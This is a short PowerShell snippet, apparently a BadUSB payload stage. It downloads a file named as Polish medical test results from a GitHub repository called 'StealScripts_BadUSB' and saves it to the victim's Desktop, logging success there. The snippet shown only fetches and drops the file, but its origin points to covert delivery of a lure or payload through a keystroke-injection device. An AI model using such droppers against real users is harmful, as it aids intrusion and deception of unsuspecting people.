& {
    $wc = New-Object Net.WebClient
    $pdfUrl = 'https://raw.githubusercontent.com/SecureMedica/StealScripts_BadUSB/main/WynikiBadan.pdf'
    $savePath = "$env:USERPROFILE\Desktop\Wyniki.pdf"
    $wc.DownloadFile($pdfUrl, $savePath)
    "Pobrano pomyślnie: $savePath" | Out-File "$env:USERPROFILE\Desktop\download_log.txt"
    }
